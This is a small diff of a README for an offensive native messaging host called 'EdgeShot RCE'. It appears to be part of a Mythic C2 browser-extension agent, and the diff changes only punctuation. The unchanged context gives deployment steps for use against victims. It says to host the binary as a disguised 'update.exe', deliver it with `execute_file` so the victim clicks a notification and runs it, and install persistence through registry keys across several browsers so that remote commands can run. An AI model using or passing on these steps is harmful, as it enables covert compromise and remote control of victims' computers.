@@ -1,13 +1,13 @@
 # EdgeShot RCE Native Host
 
 The `execute_cmd` and `check_rce` commands talk to a **Native Messaging host**
-(`com.site.agent`) over stdin/stdout. This folder ships the host **source** — it
+(`com.site.agent`) over stdin/stdout. This folder ships the host **source**; it
 is NOT compiled by the Mythic build container (no Windows cross-compiler there).
 Compile it once locally, host the binary, then drop it with `execute_file`.
 
 ## 1. Compile (Windows host)
 
-One command — **no browser flag**. The host registers itself under **all
+One command, **no browser flag**. The host registers itself under **all
 supported browsers** (Chrome, Edge, Brave, Vivaldi) at install time, so the same
 binary works regardless of the target browser.
 
@@ -22,7 +22,7 @@ Result: a ~46 KB standalone `update.exe`, no dependencies. Install MinGW with
 ## 2. Deploy
 
 1. Host `update.exe` anywhere the victim's browser can reach it.
-2. `execute_file <url_to_update.exe>` — the victim clicks the notification and
+2. `execute_file <url_to_update.exe>`: the victim clicks the notification and
    the binary runs.
 3. The binary is **dual-mode**: on first run it installs itself
    (`%LOCALAPPDATA%\Config\update.exe` + `manifest.json` + `HKCU` registry keys,
@@ -47,7 +47,7 @@ with a 60 s timeout. Message size is capped at 1 MB (Chrome's limit).
 ## 4. Notes
 
 - The host discovers extension IDs at install time (both packed and unpacked,
-  across all supported browsers) so `allowed_origins` matches the real agent ID —
+  across all supported browsers) so `allowed_origins` matches the real agent ID;
   Chrome rejects wildcards.
 - `allowed_origins` uses `chrome-extension://<32-char-id>/`.
 - If `check_rce` reports `rce_active: false`, the host is not installed or the
